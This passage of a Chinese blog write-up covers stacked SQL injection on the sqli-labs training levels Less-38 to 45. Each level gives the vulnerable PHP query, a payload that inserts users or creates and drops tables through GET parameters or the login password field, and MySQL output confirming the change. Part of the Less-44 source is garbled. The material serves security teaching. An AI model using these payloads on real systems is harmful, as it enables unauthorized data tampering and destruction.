+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user_test;select 1,2,3;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//1049983-20180929015650885-769688906-20250418145621-rkshp8y.gif" alt="1049983-20180929015650885-769688906"></p>
+<p>(4) 修改数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user_test;update user_test set name=&#x27;modify&#x27; where name=&#x27;张三&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//1049983-20180929015651359-2117725775-20250418145626-lnlx1c8.gif" alt="1049983-20180929015651359-2117725775"></p>
+<p>‍</p>
+<h2 id="0x04-堆叠注入之sqllaps实列"><a href="#0x04-堆叠注入之sqllaps实列" class="headerlink" title="0x04 堆叠注入之sqllaps实列"></a>0x04 堆叠注入之sqllaps实列</h2><h2 id="1-Less-38-堆叠注入-字符型-GET"><a href="#1-Less-38-堆叠注入-字符型-GET" class="headerlink" title="1.Less-38 堆叠注入 - 字符型 - GET"></a>1.Less-38 堆叠注入 - 字符型 - GET</h2><p>（1）源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>（2）测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1’;insert into users(id,username,password) values (‘38’,’less38’,’hello’)–+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">+----+----------+------------+</span><br><span class="line"></span><br><span class="line">| id | username | password   |</span><br><span class="line"></span><br><span class="line">+----+----------+------------+</span><br><span class="line"></span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line"></span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line"></span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line"></span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line"></span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line"></span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line"></span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line"></span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line"></span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line"></span><br><span class="line">| 10 | admin2| admin2     |</span><br><span class="line"></span><br><span class="line">| 11 | admin3| admin3     |</span><br><span class="line"></span><br><span class="line">| 12 | dhakkan| dumbo      |</span><br><span class="line"></span><br><span class="line">| 14 | admin4| admin4     |</span><br><span class="line"></span><br><span class="line">| 38 | less38| hello      |</span><br><span class="line"></span><br><span class="line">+----+----------+------------+</span><br><span class="line"></span><br><span class="line">14 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>发现已经添加了一个 less38 用户</p>
+<p>?id=1’;create table less38 like users;</p>
+<p>?id=1’;drop table less38;</p>
+<h2 id="2-Less-39-堆叠注入-整型-GET"><a href="#2-Less-39-堆叠注入-整型-GET" class="headerlink" title="2.Less-39 堆叠注入 - 整型 - GET"></a>2.Less-39 堆叠注入 - 整型 - GET</h2><p>（1）源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>（2）测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1;insert into users(id,username,password) values (‘39’,’less39’,’hello’)–-</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line"></span><br><span class="line">+----+----------+------------+</span><br><span class="line"></span><br><span class="line">| id | username | password   |</span><br><span class="line"></span><br><span class="line">+----+----------+------------+</span><br><span class="line"></span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line"></span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line"></span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line"></span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line"></span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line"></span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line"></span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line"></span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line"></span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line"></span><br><span class="line">| 10 | admin2| admin2     |</span><br><span class="line"></span><br><span class="line">| 11 | admin3| admin3     |</span><br><span class="line"></span><br><span class="line">| 12 | dhakkan| dumbo      |</span><br><span class="line"></span><br><span class="line">| 14 | admin4| admin4     |</span><br><span class="line"></span><br><span class="line">| 38 | less38| hello      |</span><br><span class="line"></span><br><span class="line">| 39 | less39| hello      |</span><br><span class="line"></span><br><span class="line">+----+----------+------------+</span><br><span class="line"></span><br><span class="line">15 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到已经添加了 less39 用户了</p>
+<p>?id=1;create table less39 like users;</p>
+<p>?id=1;drop table less39;</p>
+<h2 id="3-Less-40-盲注-堆叠注入-字符型-GET"><a href="#3-Less-40-盲注-堆叠注入-字符型-GET" class="headerlink" title="3.Less-40 盲注 - 堆叠注入 - 字符型 - GET"></a>3.Less-40 盲注 - 堆叠注入 - 字符型 - GET</h2><p>（1）源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>（2）测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1’); insert into users(id,username,password) values (‘40’,’less40’,’hello’)–+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line"></span><br><span class="line">+-----+----------+------------+</span><br><span class="line"></span><br><span class="line">| id  | username | password   |</span><br><span class="line"></span><br><span class="line">+-----+----------+------------+</span><br><span class="line"></span><br><span class="line">|   1 | Dumb     | Dumb       |</span><br><span class="line"></span><br><span class="line">|   2 | Angelina | I-kill-you |</span><br><span class="line"></span><br><span class="line">|   3 | Dummy    | p@ssword   |</span><br><span class="line"></span><br><span class="line">|   4 | secure   | crappy     |</span><br><span class="line"></span><br><span class="line">|   5 | stupid   | stupidity  |</span><br><span class="line"></span><br><span class="line">|   6 | superman | genious    |</span><br><span class="line"></span><br><span class="line">|   7 | batman   | mob!le     |</span><br><span class="line"></span><br><span class="line">|   8 | admin    | admin      |</span><br><span class="line"></span><br><span class="line">|   9 | admin1   | admin1     |</span><br><span class="line"></span><br><span class="line">|  10 | admin2   | admin2     |</span><br><span class="line"></span><br><span class="line">|  11 | admin3   | admin3     |</span><br><span class="line"></span><br><span class="line">|  12 | dhakkan  | dumbo      |</span><br><span class="line"></span><br><span class="line">|  14 | admin4   | admin4     |</span><br><span class="line"></span><br><span class="line">|  38 | less38   | hello      |</span><br><span class="line"></span><br><span class="line">|  39 | less39   | hello      |</span><br><span class="line"></span><br><span class="line">| 109 | hello| hello      |</span><br><span class="line"></span><br><span class="line">|  40 | less40   | hello      |</span><br><span class="line"></span><br><span class="line">+-----+----------+------------+</span><br><span class="line"></span><br><span class="line">17 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>看到添加了 less40 用户</p>
+<p>?id=1’);create table less40 like users;</p>
+<p>?id=1’);drop table less40;</p>
+<h2 id="4-Less-41-盲注-堆叠注入-整型-GET"><a href="#4-Less-41-盲注-堆叠注入-整型-GET" class="headerlink" title="4.Less-41 盲注 - 堆叠注入 - 整型 - GET"></a>4.Less-41 盲注 - 堆叠注入 - 整型 - GET</h2><p>（1）源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>（2）测试（盲注）</p>
+<p>创建users表和增加字段值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1; insert into users(id,username,password) values (‘110’,’less41’,’hello’)–+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line"></span><br><span class="line">+-----+----------+------------+</span><br><span class="line"></span><br><span class="line">| id  | username | password   |</span><br><span class="line"></span><br><span class="line">+-----+----------+------------+</span><br><span class="line"></span><br><span class="line">|   1 | Dumb     | Dumb       |</span><br><span class="line"></span><br><span class="line">|   2 | Angelina | I-kill-you |</span><br><span class="line"></span><br><span class="line">|   3 | Dummy    | p@ssword   |</span><br><span class="line"></span><br><span class="line">|   4 | secure   | crappy     |</span><br><span class="line"></span><br><span class="line">|   5 | stupid   | stupidity  |</span><br><span class="line"></span><br><span class="line">|   6 | superman | genious    |</span><br><span class="line"></span><br><span class="line">|   7 | batman   | mob!le     |</span><br><span class="line"></span><br><span class="line">|   8 | admin    | admin      |</span><br><span class="line"></span><br><span class="line">|   9 | admin1   | admin1     |</span><br><span class="line"></span><br><span class="line">|  10 | admin2   | admin2     |</span><br><span class="line"></span><br><span class="line">|  11 | admin3   | admin3     |</span><br><span class="line"></span><br><span class="line">|  12 | dhakkan  | dumbo      |</span><br><span class="line"></span><br><span class="line">|  14 | admin4   | admin4     |</span><br><span class="line"></span><br><span class="line">|  38 | less38   | hello      |</span><br><span class="line"></span><br><span class="line">|  39 | less39   | hello      |</span><br><span class="line"></span><br><span class="line">| 109 | hello| hello      |</span><br><span class="line"></span><br><span class="line">|  40 | less40   | hello      |</span><br><span class="line"></span><br><span class="line">| 110 | less41| hello      |</span><br><span class="line"></span><br><span class="line">+-----+----------+------------+</span><br><span class="line"></span><br><span class="line">18 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>添加了用户 less41</p>
+<p>?id=1;create table less41 like users;  &#x2F;&#x2F;增加表</p>
+<p>?id=1;drop table less41;  &#x2F;&#x2F;删除表</p>
+<h2 id="5-Less-42-报错型堆叠注入-字符型-POST"><a href="#5-Less-42-报错型堆叠注入-字符型-POST" class="headerlink" title="5.Less-42 报错型堆叠注入 - 字符型 - POST"></a>5.Less-42 报错型堆叠注入 - 字符型 - POST</h2><p>（1）源代码（login.php）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$username = mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);</span><br><span class="line"></span><br><span class="line">$password = $_POST[&quot;login_password&quot;];</span><br><span class="line"></span><br><span class="line">$sql = &quot;SELECT * FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;  </span><br></pre></td></tr></table></figure>
+
+<p><strong>Password</strong> 变量在<strong>post</strong> 过程中，<strong>没有</strong>通过 mysql_real_escape_string() <strong>函数</strong>的<strong>处理</strong>。因此在登录的时候<strong>密码选项</strong>我们可以进行 <strong>attack</strong>。</p>
+<p>（2）报错测试</p>
+<p>测试语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username：任意</span><br><span class="line"></span><br><span class="line">password ：  c&#x27;;drop table me#   # 删除 me 表</span><br></pre></td></tr></table></figure>
+
+<p>或者：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username：任意</span><br><span class="line"></span><br><span class="line">password ： c&#x27;;create table me like users# // 创建一个 me 表</span><br></pre></td></tr></table></figure>
+
+<p>登录之前查看表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| Tables_in_security |</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| emails|</span><br><span class="line"></span><br><span class="line">| referers|</span><br><span class="line"></span><br><span class="line">| uagents|</span><br><span class="line"></span><br><span class="line">| users|</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>登录前创建表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username ：admin</span><br><span class="line"></span><br><span class="line">password ：  c&#x27;;create table less42 like users#</span><br></pre></td></tr></table></figure>
+
+<p>登录后查看创建表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| Tables_in_security |</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| emails|</span><br><span class="line"></span><br><span class="line">| less42|</span><br><span class="line"></span><br><span class="line">| referers|</span><br><span class="line"></span><br><span class="line">| uagents|</span><br><span class="line"></span><br><span class="line">| users|</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>发现添加了一个 less42 表，登录时构造的 sql 语句为:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=’admin’ and password=’c’;create table less42 like users–+     //利用 c’;drop table me#作为登录密码，删除该表。</span><br></pre></td></tr></table></figure>
+
+<p>登录前删除表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username： admin </span><br><span class="line">password ：  c’;drop table less42#</span><br></pre></td></tr></table></figure>
+
+<p>登录后查看删除表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| Tables_in_security |</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| emails|</span><br><span class="line"></span><br><span class="line">| referers|</span><br><span class="line"></span><br><span class="line">| uagents|</span><br><span class="line"></span><br><span class="line">| users|</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h2 id="6-Less-43-报错型-堆叠注入-字符型-POST"><a href="#6-Less-43-报错型-堆叠注入-字符型-POST" class="headerlink" title="6.Less-43 报错型 - 堆叠注入 - 字符型 - POST"></a>6.Less-43 报错型 - 堆叠注入 - 字符型 - POST</h2><p>（1）源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$username = mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);</span><br><span class="line"></span><br><span class="line">$password = $_POST[&quot;login_password&quot;];</span><br><span class="line"></span><br><span class="line">$sql = &quot;SELECT * FROM users WHERE username=(&#x27;$username&#x27;) and password=(&#x27;$password&#x27;)&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>（2）测试</p>
+<p>登录前测创建表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username ： admin</span><br><span class="line"></span><br><span class="line">password：  c&#x27;);create table less43 like users#</span><br></pre></td></tr></table></figure>
+
+<p>登录后查看增加表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| Tables_in_security |</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| emails|</span><br><span class="line"></span><br><span class="line">| less43|</span><br><span class="line"></span><br><span class="line">| referers|</span><br><span class="line"></span><br><span class="line">| uagents|</span><br><span class="line"></span><br><span class="line">| users|</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>登录前测试删除表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username ：admin</span><br><span class="line"></span><br><span class="line">password ： c&#x27;);drop table less43#</span><br></pre></td></tr></table></figure>
+
+<p>登录后查看删除表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| Tables_in_security |</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| emails|</span><br><span class="line"></span><br><span class="line">| referers|</span><br><span class="line"></span><br><span class="line">| uagents|</span><br><span class="line"></span><br><span class="line">| users|</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h2 id="6-Less-44-盲注-堆叠注入-字符型-POST"><a href="#6-Less-44-盲注-堆叠注入-字符型-POST" class="headerlink" title="6.Less-44 盲注 - 堆叠注入 - 字符型 - POST"></a>6.Less-44 盲注 - 堆叠注入 - 字符型 - POST</h2><p>（1）源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">username=mysqlirealescapestring(username=mysqlirealescapestring(con1, POST[“loginuser”]);POST[“loginuser”]); password =</span><br><span class="line"></span><br><span class="line">POST[“loginpassword”];POST[“loginpassword”]; sql = &quot;SELECT * FROM users WHERE</span><br><span class="line"></span><br><span class="line">username=&#x27;username′andpassword=′username′andpassword=′password’”;</span><br></pre></td></tr></table></figure>
+
+<p>（2）测试（盲注）</p>
+<p>登录前测试插入表和值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username ： admin</span><br><span class="line"></span><br><span class="line">password ： a&#x27;;insert into users(id,username,password) values (&#x27;144&#x27;,&#x27;less44&#x27;,&#x27;hello&#x27;)#</span><br></pre></td></tr></table></figure>
+
+<p>登录后查看增加表和值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line"></span><br><span class="line">+-----+----------+------------+</span><br><span class="line"></span><br><span class="line">| id  | username | password   |</span><br><span class="line"></span><br><span class="line">+-----+----------+------------+</span><br><span class="line"></span><br><span class="line">|   1 | Dumb     | Dumb       |</span><br><span class="line"></span><br><span class="line">|   2 | Angelina | I-kill-you |</span><br><span class="line"></span><br><span class="line">|   3 | Dummy    | p@ssword   |</span><br><span class="line"></span><br><span class="line">|   4 | secure   | crappy     |</span><br><span class="line"></span><br><span class="line">|   5 | stupid   | stupidity  |</span><br><span class="line"></span><br><span class="line">|   6 | superman | genious    |</span><br><span class="line"></span><br><span class="line">|   7 | batman   | mob!le     |</span><br><span class="line"></span><br><span class="line">|   8 | admin    | admin      |</span><br><span class="line"></span><br><span class="line">|   9 | admin1   | admin1     |</span><br><span class="line"></span><br><span class="line">|  10 | admin2   | admin2     |</span><br><span class="line"></span><br><span class="line">|  11 | admin3   | admin3     |</span><br><span class="line"></span><br><span class="line">|  12 | dhakkan  | dumbo      |</span><br><span class="line"></span><br><span class="line">|  14 | admin4   | admin4     |</span><br><span class="line"></span><br><span class="line">|  38 | less38   | hello      |</span><br><span class="line"></span><br><span class="line">|  39 | less39   | hello      |</span><br><span class="line"></span><br><span class="line">| 109 | hello| hello      |</span><br><span class="line"></span><br><span class="line">|  40 | less40   | hello      |</span><br><span class="line"></span><br><span class="line">| 110 | less41| hello      |</span><br><span class="line"></span><br><span class="line">| 144 | less44| hello      |</span><br><span class="line"></span><br><span class="line">+-----+----------+------------+</span><br><span class="line"></span><br><span class="line">19 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h2 id="7-Less-45-报错型堆叠注入-字符型-POST"><a href="#7-Less-45-报错型堆叠注入-字符型-POST" class="headerlink" title="7.Less-45 报错型堆叠注入 - 字符型 - POST"></a>7.Less-45 报错型堆叠注入 - 字符型 - POST</h2><p>（1）源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$username = mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);</span><br><span class="line"></span><br><span class="line">$password = $_POST[&quot;login_password&quot;];</span><br><span class="line"></span><br><span class="line">$sql = &quot;SELECT * FROM users WHERE username=(&#x27;$username&#x27;) and password=(&#x27;$password&#x27;)&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>（2）测试</p>
+<p>登录前测试增加表</p>
